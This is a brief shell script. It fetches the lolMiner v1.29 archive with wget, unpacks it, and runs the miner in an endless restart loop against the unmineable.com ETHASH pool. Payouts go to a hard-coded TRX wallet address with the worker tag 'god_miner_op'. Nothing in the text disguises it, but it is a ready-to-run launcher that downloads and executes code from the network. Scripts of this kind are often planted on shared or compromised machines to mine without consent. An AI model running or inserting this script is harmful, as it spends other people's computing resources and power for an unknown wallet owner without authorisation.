#!/bin/sh
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
while [ 1 ]; do
./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TW6x5pAKLKk88DTSzZ8ZQCDp3Qe4bATn3k.god_miner_op#ek61-6h9x --ethstratum ETHPROXY -p x --cpu 72
sleep 3
done
sleep 2000